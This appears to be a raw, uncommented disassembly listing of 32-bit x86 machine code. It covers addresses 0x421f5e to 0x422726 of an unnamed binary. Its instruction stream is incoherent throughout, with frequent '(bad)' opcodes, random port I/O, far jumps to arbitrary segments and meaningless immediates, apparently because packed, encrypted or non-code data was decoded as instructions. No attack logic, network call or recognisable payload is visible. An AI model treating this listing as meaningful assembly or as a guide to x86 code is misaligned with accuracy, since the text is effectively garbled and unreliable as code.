  421f5e:	pop    eax
  421f5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f60:	adc    ch,BYTE PTR [ebp-0x49]
  421f63:	aas    
  421f64:	or     BYTE PTR [esi],cl
  421f66:	push   ecx
  421f67:	arpl   WORD PTR [edi],di
  421f69:	aas    
  421f6a:	inc    edi
  421f6b:	test   BYTE PTR [ecx],cl
  421f6d:	lahf   
  421f6e:	imul   ebx,DWORD PTR [esi+0x5d],0x6
  421f72:	out    0xac,al
  421f74:	hlt    
  421f75:	inc    edi
  421f76:	mov    edi,0xf37965af
  421f7b:	fstp   QWORD PTR [esi-0x1d21df14]
  421f81:	push   ecx
  421f82:	in     eax,0x9d
  421f84:	mov    ds:0x9fb2ef22,al
  421f89:	xchg   BYTE PTR [ebp+0x65],bl
  421f8c:	mov    esi,0x92ca0e8c
  421f91:	mov    edx,0xf6963273
  421f96:	daa    
  421f97:	(bad)  
  421f98:	bound  ebx,QWORD PTR [ebx]
  421f9a:	pop    edi
  421f9b:	fdiv   QWORD PTR [ecx+edx*4-0x4f]
  421f9f:	out    dx,al
  421fa0:	pushf  
  421fa1:	rcr    BYTE PTR [esp+edi*2],0x14
  421fa5:	fisubr WORD PTR [esi-0x2f]
  421fa8:	sbb    esi,DWORD PTR [ebp+0x41e29ae3]
  421fae:	daa    
  421faf:	mov    ebp,0xbbdce907
  421fb4:	inc    ebp
  421fb5:	out    0x57,al
  421fb7:	dec    eax
  421fb8:	xor    dl,BYTE PTR [ebx+eax*1+0x51]
  421fbc:	add    bh,BYTE PTR [ebx]
  421fbe:	dec    eax
  421fbf:	dec    edi
  421fc0:	jge    0x422018
  421fc2:	lods   al,BYTE PTR ds:[esi]
  421fc3:	lods   al,BYTE PTR ds:[esi]
  421fc4:	xlat   BYTE PTR ds:[ebx]
  421fc5:	idiv   BYTE PTR [esi-0x4]
  421fc8:	into   
  421fc9:	pop    es
  421fca:	(bad)  
  421fcb:	(bad)  
  421fcc:	fs daa 
  421fce:	std    
  421fcf:	ror    edx,cl
  421fd1:	es or  ebp,esp
  421fd4:	scas   eax,DWORD PTR es:[edi]
  421fd5:	cmp    eax,0xa7d797b5
  421fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fdb:	jmp    0xfb51:0xe64209c
  421fe2:	loopne 0x421f83
  421fe4:	xchg   BYTE PTR [edx],al
  421fe6:	mov    ebx,0xeb834568
  421feb:	cmp    eax,0xfb06abd1
  421ff0:	cmp    DWORD PTR [ebx-0x45],0xffffffb0
  421ff4:	ficomp DWORD PTR [ebp-0x7ff3f858]
  421ffa:	xchg   edi,eax
  421ffb:	sbb    ecx,esp
  421ffd:	cmp    al,BYTE PTR [ebp+0x5d]
  422000:	mov    edx,0x312ff9f3
  422005:	sti    
  422006:	mov    esp,0xd1e2fd3e
  42200b:	bound  esi,QWORD PTR [esi]
  42200d:	repnz (bad) 
  42200f:	mov    cl,0x43
  422011:	mov    si,0x443c
  422015:	jle    0x42206a
  422017:	cdq    
  422018:	aaa    
  422019:	mov    eax,0x6ecdd5e
  42201e:	pop    ebx
  42201f:	adc    BYTE PTR [esi],dh
  422021:	pop    edi
  422022:	sti    
  422023:	mov    edx,DWORD PTR [edx]
  422025:	jmp    0x422038
  422027:	sub    BYTE PTR [eax+0x73],ch
  42202a:	sbb    eax,0xee7c44ec
  42202f:	mov    esi,0x6ba343e4
  422034:	ret    0xfaca
  422037:	ins    BYTE PTR es:[edi],dx
  422038:	mov    edx,esp
  42203a:	mov    ds:0xbaf5c1e1,al
  42203f:	fild   WORD PTR [edx]
  422041:	fisubr WORD PTR fs:[esi+0xf186a3a]
  422048:	pushf  
  422049:	mov    BYTE PTR [ebx],bl
  42204b:	cwde   
  42204c:	out    0x5b,eax
  42204e:	les    ebx,FWORD PTR [ebx+0x79]
  422051:	(bad)  
  422053:	lock icebp 
  422055:	mov    ah,0x1e
  422057:	fstp   TBYTE PTR [ebp+0x34a0a091]
  42205d:	pusha  
  42205e:	scas   al,BYTE PTR es:[edi]
  42205f:	cwde   
  422060:	call   0x2f71:0x34874e72
  422067:	mov    bl,0x18
  422069:	sub    eax,0x934b5929
  42206e:	jmp    0xa006a042
  422073:	leave  
  422074:	pop    esp
  422075:	das    
  422076:	jmp    0x6e2d0aa4
  42207b:	pop    ebp
  42207c:	mov    ds:0xb534534,eax
  422081:	and    DWORD PTR [ebp+0x6627ff62],edx
  422087:	loopne 0x4220d8
  422089:	data16 cmp al,0x9b
  42208c:	cld    
  42208d:	pop    ebx
  42208e:	shr    DWORD PTR [edi],1
  422090:	cdq    
  422091:	add    BYTE PTR [ebx-0x26],al
  422094:	int3   
  422095:	in     al,dx
  422096:	daa    
  422097:	jae    0x422034
  422099:	dec    eax
  42209a:	or     edi,esi
  42209c:	call   0xac6f:0xc50dc7
  4220a3:	jmp    esi
  4220a5:	icebp  
  4220a6:	fld    QWORD PTR [ecx+0x7c]
  4220a9:	xchg   ebp,eax
  4220aa:	outs   dx,BYTE PTR ds:[esi]
  4220ab:	dec    esp
  4220ac:	stc    
  4220ad:	jp     0x4220c6
  4220af:	pop    ebx
  4220b0:	mov    edi,0xe8b13b07
  4220b5:	test   DWORD PTR [ecx-0x786cc707],edx
  4220bb:	loop   0x422075
  4220bd:	fstp   TBYTE PTR [edx+ebx*2-0x7662b8f5]
  4220c4:	sti    
  4220c5:	inc    edi
  4220c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220c7:	icebp  
  4220c8:	inc    edi
  4220c9:	jbe    0x422061
  4220cb:	sbb    bh,BYTE PTR [ebp-0x7e]
  4220ce:	xchg   esi,eax
  4220cf:	mov    ch,0x5f
  4220d1:	mov    eax,0x3ae34f26
  4220d6:	add    ebx,DWORD PTR [ebx]
  4220d8:	scas   eax,DWORD PTR es:[edi]
  4220d9:	mov    ecx,0xebdf3421
  4220de:	add    DWORD PTR [eax],0x1c475c60
  4220e4:	dec    ebx
  4220e5:	jge    0x422088
  4220e7:	(bad)  
  4220e8:	popf   
  4220e9:	test   eax,0x77b11e52
  4220ee:	shl    BYTE PTR [ecx],1
  4220f0:	sbb    eax,0xc56f6677
  4220f5:	es loope 0x4220c7
  4220f8:	sub    DWORD PTR [ebx-0x77],edx
  4220fb:	or     esp,DWORD PTR [edi]
  4220fd:	bound  ecx,QWORD PTR [esi+0x63]
  422100:	cmp    ah,BYTE PTR [eax-0x59]
  422103:	inc    ebp
  422104:	pop    esi
  422105:	bound  edx,QWORD PTR [ebp+0x1ed72d9f]
  42210b:	mov    ebp,0x76f765a2
  422110:	mov    ds:0xee609c68,al
  422115:	dec    ecx
  422116:	mov    ebx,esi
  422118:	cld    
  422119:	xor    BYTE PTR [edx+0x1fe07079],0x17
  422120:	or     ecx,0xe2bc8871
  422126:	pushf  
  422127:	outs   dx,DWORD PTR ds:[esi]
  422128:	iret   
  422129:	xchg   esp,eax
  42212a:	leave  
  42212b:	add    al,0xfe
  42212d:	push   eax
  42212e:	pop    edi
  42212f:	sti    
  422130:	adc    esi,DWORD PTR ds:0xe6f1cfb2
  422136:	gs dec esi
  422138:	sbb    BYTE PTR [ecx+0x29],bh
  42213b:	fisubr WORD PTR [esi+0x8138779]
  422141:	mov    ebp,0xc9de83f7
  422146:	xlat   BYTE PTR ds:[ebx]
  422147:	test   al,0x95
  422149:	adc    eax,0x93c71a2f
  42214e:	lods   al,BYTE PTR ds:[esi]
  42214f:	mov    ds:0x90923ea,eax
  422154:	dec    edi
  422155:	rcl    BYTE PTR [ebp+0x1a],0x34
  422159:	call   0xdf9f:0x7f642524
  422160:	(bad)  
  422161:	mov    ah,0xe6
  422163:	dec    ecx
  422164:	retf   
  422165:	call   0xfe41:0x9121ac81
  42216c:	xchg   edx,eax
  42216d:	and    ecx,DWORD PTR [edx+0x2a]
  422170:	pop    esi
  422171:	and    ebx,ebx
  422173:	dec    edi
  422174:	sbb    eax,DWORD PTR [esi-0xee0fc85]
  42217a:	adc    eax,0xa93030f9
  42217f:	pop    edi
  422180:	ficomp DWORD PTR [edx-0x32]
  422183:	or     cl,al
  422185:	mov    BYTE PTR [ebx],dh
  422187:	xor    ah,BYTE PTR [ebp-0x9]
  42218a:	(bad)  
  42218c:	push   ebp
  42218d:	aam    0x33
  42218f:	sbb    dh,BYTE PTR [ecx-0x7]
  422192:	cwde   
  422193:	mov    ebx,ecx
  422195:	push   cs
  422196:	sbb    ebx,DWORD PTR [ebp+edx*2+0x3417d0af]
  42219d:	mov    bl,BYTE PTR [edi+0x42]
  4221a0:	push   es
  4221a1:	mov    ds:0x583102eb,al
  4221a6:	pop    ecx
  4221a7:	aas    
  4221a8:	aad    0x24
  4221aa:	push   0x873fd3c5
  4221af:	fild   DWORD PTR [ecx+0xae5a728]
  4221b5:	mov    eax,0x22f6a614
  4221ba:	aam    0xbb
  4221bc:	inc    eax
  4221bd:	mov    ebx,0x364c9f02
  4221c2:	loopne 0x422156
  4221c4:	mov    BYTE PTR [edi-0x1c],ch
  4221c7:	push   ss
  4221c8:	adc    eax,0x5e21df72
  4221cd:	push   eax
  4221ce:	(bad)
  4221d1:	and    ebx,DWORD PTR [ebp+0x43]
  4221d4:	out    dx,al
  4221d5:	in     eax,dx
  4221d6:	pop    esp
  4221d7:	lds    edx,FWORD PTR [edx]
  4221d9:	shl    cl,cl
  4221db:	lock jne 0x422160
  4221de:	xchg   esi,eax
  4221df:	loope  0x42216f
  4221e1:	(bad)  
  4221e2:	or     BYTE PTR [ebp+eax*4+0x70],cl
  4221e6:	add    edi,DWORD PTR [edi+edi*4+0x4a]
  4221ea:	mov    ch,0xd1
  4221ec:	das    
  4221ed:	sbb    eax,0x3f0f1114
  4221f2:	inc    ebp
  4221f3:	imul   edx,DWORD PTR [esi],0x4a1fedee
  4221f9:	dec    ecx
  4221fa:	pop    edi
  4221fb:	sub    DWORD PTR [ebx],edx
  4221fd:	pop    edi
  4221fe:	neg    DWORD PTR [edx-0x2de5db4e]
  422204:	add    BYTE PTR [edi],bh
  422206:	mov    ?,WORD PTR [edi+0x68]
  422209:	inc    edx
  42220a:	mov    al,ds:0xfb5bb457
  42220f:	sbb    al,0xfe
  422211:	cmp    al,BYTE PTR [edi-0x29364ddf]
  422217:	jno    0x4221d8
  422219:	test   DWORD PTR [eax],ebp
  42221b:	push   esi
  42221c:	mov    DWORD PTR [edx+edx*1+0x37d28fce],edi
  422223:	dec    DWORD PTR [ecx-0x25]
  422226:	push   0xb5c6c31c
  42222b:	or     al,0xc1
  42222d:	fldcw  WORD PTR [ebx]
  42222f:	add    eax,0x75464bbb
  422234:	ret    0xca54
  422237:	mov    al,0x73
  422239:	mov    bl,0xee
  42223b:	frstor [ecx]
  42223d:	adc    esi,DWORD PTR [ebp-0x432238f6]
  422243:	in     al,0xed
  422245:	lahf   
  422246:	and    eax,DWORD PTR [ecx]
  422248:	and    al,0x5a
  42224a:	cmp    eax,0x38335ea5
  42224f:	add    eax,0xb50513d9
  422254:	mov    edx,ds
  422256:	je     0x4221ee
  422258:	cmp    dh,BYTE PTR [ecx-0x75ed69eb]
  42225e:	data16 outs dx,BYTE PTR ds:[esi]
  422260:	mov    ebp,0x8b53353e
  422265:	add    eax,0xee7aa5b1
  42226a:	addr16 mov eax,0x9e59b9b6
  422270:	mov    dl,0x90
  422272:	jo     0x4222a1
  422274:	xchg   DWORD PTR [ecx],edx
  422276:	dec    ebp
  422277:	jns    0x42222b
  422279:	xchg   ebx,eax
  42227a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42227b:	lds    ecx,FWORD PTR [esi]
  42227d:	jmp    0x42227b
  42227f:	sub    eax,esp
  422281:	lds    edi,FWORD PTR [eax]
  422283:	push   ss
  422284:	sub    BYTE PTR [eax+0xe74271a],cl
  42228a:	adc    BYTE PTR [edi+0x19],al
  42228d:	xor    eax,0x333c499
  422292:	or     BYTE PTR [ecx-0x45989927],ch
  422298:	mov    al,ds:0x36655d39
  42229d:	jl     0x4222c5
  42229f:	gs xchg edx,eax
  4222a1:	bound  esi,QWORD PTR [edx-0x34b7659b]
  4222a7:	sbb    al,0x33
  4222a9:	cmc    
  4222aa:	hlt    
  4222ab:	retf   0x1eaa
  4222ae:	call   0x8c3674e
  4222b3:	xor    eax,0xe11a1e74
  4222b8:	dec    ebp
  4222b9:	out    dx,eax
  4222ba:	xor    DWORD PTR [edi+eiz*2+0x187106d1],ecx
  4222c1:	rol    DWORD PTR [ecx+ebx*1-0x69],cl
  4222c5:	int3   
  4222c6:	and    DWORD PTR [esi+0xfb37ca7],ecx
  4222cc:	cs mov al,0x85
  4222cf:	dec    edi
  4222d0:	int    0xa4
  4222d2:	mov    dh,0x92
  4222d4:	pop    edx
  4222d5:	ss push edi
  4222d7:	arpl   WORD PTR [edx],sp
  4222d9:	mov    bl,0xc3
  4222db:	mov    ebx,ebx
  4222dd:	mov    esp,0x2accc8e2
  4222e2:	fimul  WORD PTR [ecx]
  4222e4:	pop    edi
  4222e5:	xchg   esp,eax
  4222e6:	stc    
  4222e7:	push   0x14
  4222e9:	or     eax,0x32026e8d
  4222ee:	or     al,0xb2
  4222f0:	leave  
  4222f1:	cld    
  4222f2:	dec    ebx
  4222f3:	xor    eax,0x3d6a6fc
  4222f8:	sub    edx,DWORD PTR [ecx+0x71]
  4222fb:	(bad)  [ecx]
  4222fd:	and    al,0xaf
  4222ff:	bound  edi,QWORD PTR [edx]
  422301:	repz or DWORD PTR [ecx],0xffffff85
  422305:	clc    
  422306:	shl    BYTE PTR [eax],cl
  422308:	es hlt 
  42230a:	sbb    ebp,DWORD PTR [eax+0x1250f14e]
  422310:	push   ebx
  422311:	es fwait
  422313:	mov    al,ds:0xb9220826
  422318:	push   ds
  422319:	not    BYTE PTR [eax+0x14cc200b]
  42231f:	sub    eax,DWORD PTR [ecx]
  422321:	cli    
  422322:	stos   BYTE PTR es:[edi],al
  422323:	imul   edx,DWORD PTR [ebx],0xb114f136
  422329:	push   ebx
  42232a:	mov    ds:0x2ef2a932,al
  42232f:	mov    esp,0x9834281a
  422334:	pop    eax
  422335:	mov    edx,0xd4c22a25
  42233a:	fisttp WORD PTR [edi]
  42233c:	xchg   ebx,eax
  42233d:	push   ebx
  42233e:	fs popf 
  422340:	repnz cmp BYTE PTR [edx],dh
  422343:	ret    0x63ed
  422346:	xor    al,0xd
  422348:	xchg   edx,eax
  422349:	ins    BYTE PTR es:[edi],dx
  42234a:	nop
  42234b:	pop    eax
  42234c:	imul   esi,DWORD PTR [ebx-0xc60bd45],0xfffffff9
  422353:	aam    0x57
  422355:	scas   eax,DWORD PTR es:[edi]
  422356:	fbstp  TBYTE PTR [ebx+0x341839a0]
  42235c:	int    0xd7
  42235e:	lods   al,BYTE PTR ds:[esi]
  42235f:	jnp    0x4223d5
  422361:	sbb    edx,edx
  422363:	adc    al,0x41
  422365:	xor    al,0xa1
  422367:	lods   eax,DWORD PTR ds:[esi]
  422368:	add    BYTE PTR [eax-0x31],0xd6
  42236c:	cmp    eax,0xf90edd3d
  422371:	fistp  DWORD PTR [ebx]
  422373:	cli    
  422374:	pushf  
  422375:	xchg   edi,eax
  422376:	clc    
  422377:	jg     0x4223b8
  422379:	jecxz  0x422366
  42237b:	into   
  42237c:	xchg   ecx,eax
  42237d:	outs   dx,BYTE PTR ds:[esi]
  42237e:	stc    
  42237f:	xchg   edx,eax
  422380:	push   0xb9d547f2
  422385:	push   ss
  422386:	das    
  422387:	inc    ecx
  422388:	sub    al,0x6d
  42238a:	cmp    eax,0xbc6d8255
  42238f:	mov    ds:0xfe7fb8fa,al
  422394:	jb     0x422345
  422396:	lahf   
  422397:	xor    bl,BYTE PTR [ecx+0x10579331]
  42239d:	lahf   
  42239e:	mov    cl,0x27
  4223a0:	cdq    
  4223a1:	and    ecx,edx
  4223a3:	(bad)  
  4223a4:	shld   DWORD PTR [edi+0x73],ecx,cl
  4223a8:	outs   dx,DWORD PTR ds:[esi]
  4223a9:	fidiv  DWORD PTR [edx]
  4223ab:	fwait
  4223ac:	mov    ss,WORD PTR [ecx-0x2c7da6e4]
  4223b2:	cmp    ecx,ebp
  4223b4:	cmp    esp,ebp
  4223b6:	outs   dx,DWORD PTR ds:[esi]
  4223b7:	repnz enter 0xec20,0xa1
  4223bc:	inc    eax
  4223bd:	stos   BYTE PTR es:[edi],al
  4223be:	ss aad 0x24
  4223c1:	or     ch,BYTE PTR [edi+0x16]
  4223c4:	jecxz  0x422438
  4223c6:	aas    
  4223c7:	clc    
  4223c8:	aam    0xa1
  4223ca:	call   0xb6739bc
  4223cf:	ja     0x4223b4
  4223d1:	jmp    0x6fe2:0x3caa4000
  4223d8:	popf   
  4223d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223da:	test   BYTE PTR [ebx],al
  4223dc:	push   ecx
  4223dd:	lds    eax,FWORD PTR [ecx]
  4223df:	add    al,0x62
  4223e1:	scas   al,BYTE PTR es:[edi]
  4223e2:	push   ebp
  4223e3:	dec    eax
  4223e4:	stc    
  4223e5:	stos   BYTE PTR es:[edi],al
  4223e6:	jbe    0x422452
  4223e8:	pop    ebp
  4223e9:	(bad)  
  4223ea:	imul   esp,edx,0x55
  4223ed:	inc    ebx
  4223ee:	jo     0x422442
  4223f0:	es adc al,0xf6
  4223f3:	aad    0x71
  4223f5:	dec    esp
  4223f6:	inc    eax
  4223f7:	not    BYTE PTR [ebx+0x58854391]
  4223fd:	sbb    bh,BYTE PTR [edi]
  4223ff:	push   0xffffffd6
  422401:	xchg   esp,eax
  422402:	adc    esi,esi
  422404:	pop    ebx
  422405:	and    BYTE PTR [ebp-0x67969649],ch
  42240b:	pop    ebx
  42240c:	push   ebp
  42240d:	mov    esi,0x9a8d4d09
  422412:	xchg   edx,eax
  422413:	int3   
  422414:	mov    ebp,0x73ce9ba4
  422419:	sbb    al,0xf0
  42241b:	push   0x29
  42241d:	ja     0x422447
  42241f:	and    al,0xdb
  422421:	mov    dl,0x28
  422423:	mov    dh,0xf0
  422425:	cmc    
  422426:	sub    BYTE PTR [edi-0x7da26ac6],al
  42242c:	inc    eax
  42242d:	or     eax,ecx
  42242f:	jp     0x422445
  422431:	bound  esp,QWORD PTR [ebx+0x60]
  422434:	mov    cs,edx
  422436:	inc    esp
  422437:	mov    edx,0x560da933
  42243c:	sbb    BYTE PTR [edx-0x4775e68b],bl
  422442:	mov    ah,0xb5
  422444:	add    BYTE PTR [ebp-0x61],cl
  422447:	jo     0x42247d
  422449:	and    esp,esi
  42244b:	mov    ds,WORD PTR [eax-0x35]
  42244e:	pusha  
  42244f:	jae    0x422441
  422451:	mov    WORD PTR [ecx],cs
  422453:	iret   
  422454:	popa   
  422455:	xchg   cl,al
  422457:	jmp    0x42248c
  422459:	(bad)  
  42245a:	pop    ds
  42245b:	sub    BYTE PTR [esi],bh
  42245d:	add    ebp,DWORD PTR [ecx+0x75]
  422460:	imul   edx,esp,0xd84f16d5
  422466:	outs   dx,BYTE PTR ds:[esi]
  422467:	jmp    FWORD PTR [eax+0x6ef41735]
  42246d:	sbb    ecx,DWORD PTR [ebp+0x31]
  422470:	mov    bh,0xd8
  422472:	dec    ecx
  422473:	(bad)  
  422474:	xchg   ecx,eax
  422475:	pushf  
  422476:	arpl   WORD PTR [eax],bp
  422478:	jmp    0x422408
  42247a:	lods   al,BYTE PTR ds:[esi]
  42247b:	xor    DWORD PTR [ecx+0x7d1a392d],edx
  422481:	mov    DWORD PTR [ebx+ecx*4+0x1925430e],ecx
  422488:	aad    0xd0
  42248a:	outs   dx,BYTE PTR ds:[esi]
  42248b:	js     0x4224ab
  42248d:	shl    BYTE PTR [eax-0x1c9883a1],cl
  422493:	daa    
  422494:	fwait
  422495:	fs pop ebx
  422497:	scas   al,BYTE PTR es:[edi]
  422498:	dec    esp
  422499:	pop    ss
  42249a:	add    BYTE PTR [esi-0x6df4ec62],0x28
  4224a1:	cld    
  4224a2:	mov    al,0xf2
  4224a4:	(bad)  
  4224a5:	sbb    edi,DWORD PTR [edi+0x13e091d8]
  4224ab:	push   eax
  4224ac:	pusha  
  4224ad:	scas   al,BYTE PTR es:[edi]
  4224ae:	xchg   esi,eax
  4224af:	cmp    eax,0x1d6e7c62
  4224b4:	fsub   DWORD PTR [edi]
  4224b6:	push   cs
  4224b7:	loopne 0x4224a4
  4224b9:	add    bl,bl
  4224bb:	shl    BYTE PTR [edx],cl
  4224bd:	div    bl
  4224bf:	jp     0x422446
  4224c1:	fs pushf 
  4224c3:	rol    DWORD PTR [edx],1
  4224c5:	fdiv   DWORD PTR [edi]
  4224c7:	add    al,0x17
  4224c9:	sbb    BYTE PTR [esi-0x22b8ea],ah
  4224cf:	or     esp,edi
  4224d1:	mov    ecx,0xa2fbac07
  4224d6:	dec    esi
  4224d7:	lock shr DWORD PTR [esi+0x1b],1
  4224db:	pop    esp
  4224dc:	jno    0x422557
  4224de:	sbb    DWORD PTR [edx+0x25],ebx
  4224e1:	dec    ebp
  4224e2:	iret   
  4224e3:	lock sub esp,DWORD PTR [esi-0x7059c486]
  4224ea:	xchg   esp,ebx
  4224ec:	mov    es,ecx
  4224ee:	repz icebp 
  4224f0:	shr    bl,1
  4224f2:	retf   0x5272
  4224f5:	ins    DWORD PTR es:[edi],dx
  4224f6:	ret    0x771f
  4224f9:	add    DWORD PTR [edi],0x35
  4224fc:	adc    al,0x37
  4224fe:	adc    DWORD PTR [edx],ebx
  422500:	sub    cl,al
  422502:	xchg   ecx,eax
  422503:	and    eax,DWORD PTR ds:0x259061ae
  422509:	inc    edx
  42250a:	jp     0x422507
  42250c:	hlt    
  42250d:	(bad)  
  42250e:	sbb    eax,0xb89ca594
  422513:	rcr    BYTE PTR [ebp+0x7],cl
  422516:	ret    0x8b24
  422519:	sub    ebp,edx
  42251b:	cmpxchg BYTE PTR [ebx-0x2d2eceb9],bh
  422522:	fidiv  WORD PTR [ebx]
  422524:	test   eax,0x37c2d55e
  422529:	fidiv  DWORD PTR [ecx-0x32d108f5]
  42252f:	or     cl,dl
  422531:	fcom   QWORD PTR [ecx+0x7d]
  422534:	sub    BYTE PTR [ebx+0x156fa21],ah
  42253a:	inc    ebp
  42253b:	add    BYTE PTR [eax-0x79],ch
  42253e:	or     eax,0x3bff0852
  422543:	and    cl,BYTE PTR [edi-0x58]
  422546:	hlt    
  422547:	shl    DWORD PTR [esp+eax*8+0x21],1
  42254b:	pop    ds
  42254c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42254d:	test   BYTE PTR [esi-0x27a60d46],ah
  422553:	les    edi,FWORD PTR ds:0x302ddd16
  422559:	sti    
  42255a:	mov    bh,0x8f
  42255c:	dec    eax
  42255d:	mov    esp,0x27faf23a
  422562:	sbb    al,0x83
  422564:	mov    eax,ds:0x17de758e
  422569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42256a:	push   ebx
  42256b:	and    BYTE PTR [bp+di-0x7848],bh
  422570:	xchg   edx,eax
  422571:	loopne 0x422583
  422573:	mov    edi,0xde9b888b
  422578:	mov    edi,0xacbdb9b2
  42257d:	fistp  DWORD PTR [ebx+0x2c8e0619]
  422583:	jg     0x42258f
  422585:	xchg   ecx,eax
  422586:	push   esi
  422587:	inc    ecx
  422588:	and    eax,DWORD PTR [ebp+0x5d]
  42258b:	test   esp,0x910b914
  422591:	jnp    0x422534
  422593:	fisttp QWORD PTR [ebx-0x4d222051]
  422599:	shl    DWORD PTR [edi+0x72b73dea],0x84
  4225a0:	popf   
  4225a1:	stos   DWORD PTR es:[edi],eax
  4225a2:	xor    eax,0x205a898b
  4225a7:	gs xchg edi,eax
  4225a9:	xor    al,0x40
  4225ab:	and    DWORD PTR [esi-0x53],0x686eb2e3
  4225b2:	out    dx,al
  4225b3:	loopne 0x4225b9
  4225b5:	sub    cl,bl
  4225b7:	jbe    0x4225ea
  4225b9:	paddsw mm3,QWORD PTR [ecx-0x63aaf00d]
  4225c0:	in     al,0xd3
  4225c2:	rcr    DWORD PTR [eax-0x91f9a7d],cl
  4225c8:	mov    dl,BYTE PTR [eax+eiz*8-0xe]
  4225cc:	xchg   esp,eax
  4225cd:	out    0x4d,eax
  4225cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225d0:	jmp    0xa7a5:0xfc4e3aba
  4225d7:	out    dx,al
  4225d8:	or     esp,DWORD PTR [ecx+0x409536ca]
  4225de:	faddp  st(3),st
  4225e0:	xchg   edi,eax
  4225e1:	outs   dx,BYTE PTR ds:[esi]
  4225e2:	retf   
  4225e3:	(bad)  
  4225e4:	fwait
  4225e5:	pop    esp
  4225e6:	mov    esp,0x9316d1f7
  4225eb:	ins    BYTE PTR es:[edi],dx
  4225ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ed:	scas   al,BYTE PTR es:[edi]
  4225ee:	outs   dx,BYTE PTR ds:[esi]
  4225ef:	lods   eax,DWORD PTR ds:[si]
  4225f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225f2:	pop    eax
  4225f3:	dec    edx
  4225f4:	jge    0x422610
  4225f6:	jae    0x4225a8
  4225f8:	jle    0x4225e3
  4225fa:	mov    cl,0x9e
  4225fc:	aas    
  4225fd:	cmc    
  4225fe:	test   BYTE PTR [edi+esi*1+0x58],ch
  422602:	fwait
  422603:	int    0xe4
  422605:	es aas 
  422607:	add    cl,BYTE PTR [ebx]
  422609:	cmc    
  42260a:	ins    BYTE PTR es:[edi],dx
  42260b:	sbb    ebp,ebx
  42260d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42260e:	push   edx
  42260f:	inc    ebp
  422610:	pusha  
  422611:	jg     0x4225f5
  422613:	popa   
  422614:	pushf  
  422615:	pop    eax
  422616:	xor    DWORD PTR [eax],eax
  422618:	push   eax
  422619:	sub    ebx,DWORD PTR ds:0xa0591182
  42261f:	dec    edx
  422620:	dec    esp
  422621:	fisubr WORD PTR [esi+0x50219377]
  422627:	cmp    eax,0x1d5d904a
  42262c:	shr    BYTE PTR [edx+0xd],cl
  42262f:	jle    0x4225e2
  422631:	mov    bh,0x42
  422633:	sub    edi,DWORD PTR [edi-0x17]
  422636:	inc    esp
  422637:	int3   
  422638:	mov    edx,0x77193aca
  42263d:	pop    ds
  42263e:	icebp  
  42263f:	xchg   ecx,eax
  422640:	jo     0x422609
  422642:	xchg   esp,eax
  422643:	(bad)  
  422644:	pusha  
  422645:	stos   DWORD PTR es:[edi],eax
  422646:	stos   BYTE PTR es:[edi],al
  422647:	outs   dx,BYTE PTR ds:[esi]
  422648:	or     BYTE PTR [ebx+ebp*8+0x5eb260d3],ch
  42264f:	fisub  WORD PTR [edx-0x30e93afc]
  422655:	pop    ds
  422656:	add    ch,BYTE PTR [ecx+eiz*4+0x79eb1dae]
  42265d:	daa    
  42265e:	sub    bh,al
  422660:	mov    al,0x33
  422662:	jo     0x4226a3
  422664:	es test eax,0x9a16b897
  42266a:	or     DWORD PTR [ebp-0x62c95821],edi
  422670:	out    0x6d,al
  422672:	jge    0x4226b5
  422674:	push   eax
  422675:	stc    
  422676:	bound  ebp,QWORD PTR [ebx]
  422678:	sbb    DWORD PTR [edi-0x1d7d0d74],edi
  42267e:	add    eax,0x6f48bae9
  422683:	mov    DWORD PTR [ebp+eiz*1-0x7fd97791],esp
  42268a:	mov    eax,ds:0x24d3d19e
  42268f:	in     eax,dx
  422690:	mov    eax,DWORD PTR [ebx]
  422692:	repz jmp 0x42269e
  422695:	mov    ebp,0xe3f6bbe2
  42269a:	addr16 mov dl,0xf9
  42269d:	and    DWORD PTR [ecx+0x1e6f1e0f],esp
  4226a3:	dec    ecx
  4226a4:	shl    DWORD PTR [edx-0x5720971d],0x7d
  4226ab:	lods   al,BYTE PTR ds:[esi]
  4226ac:	push   eax
  4226ad:	sub    BYTE PTR [ebp-0x36],ch
  4226b0:	adc    cl,bh
  4226b2:	push   cs
  4226b3:	jl     0x422683
  4226b5:	lahf   
  4226b6:	or     DWORD PTR [edx+0x49],esi
  4226b9:	retf   0xae57
  4226bc:	jecxz  0x4226fe
  4226be:	aas    
  4226bf:	and    DWORD PTR [esi],0x9
  4226c2:	push   es
  4226c3:	push   ebp
  4226c4:	pusha  
  4226c5:	imul   ebp,DWORD PTR [eax-0xf],0x1e81a3ed
  4226cc:	cli    
  4226cd:	or     DWORD PTR [eax+esi*8-0x3d],edx
  4226d1:	mov    dl,0x92
  4226d3:	aaa    
  4226d4:	icebp  
  4226d5:	enter  0x79ff,0x2
  4226d9:	mov    bl,0x8e
  4226db:	fnstenv [esi]
  4226dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226de:	mov    ds:0xb0c77309,eax
  4226e3:	cmp    DWORD PTR [edx+0x1a],ecx
  4226e6:	or     eax,0xca31820d
  4226eb:	not    BYTE PTR ds:0xe141a44e
  4226f1:	dec    ebx
  4226f2:	add    BYTE PTR [ebx],cl
  4226f4:	cld    
  4226f5:	lea    eax,[ebp-0x7163c199]
  4226fb:	fstp   QWORD PTR [edi+0x26a31b00]
  422701:	stos   DWORD PTR es:[edi],eax
  422702:	enter  0x71e8,0x76
  422706:	out    0x69,al
  422708:	outs   dx,DWORD PTR ds:[esi]
  422709:	inc    esp
  42270a:	pop    esi
  42270b:	mov    bl,0xaa
  42270d:	out    dx,eax
  42270e:	push   es
  42270f:	outs   dx,BYTE PTR ds:[esi]
  422710:	add    al,0xbd
  422712:	push   edx
  422713:	push   cs
  422714:	adc    eax,0x9572275f
  422719:	js     0x4226cc
  42271b:	mov    es,WORD PTR [ebp-0x16]
  42271e:	sbb    eax,esi
  422720:	aam    0xb8
  422722:	bound  ecx,QWORD PTR [edi+0x77]
  422725:	clc    
  422726:	push   ebx
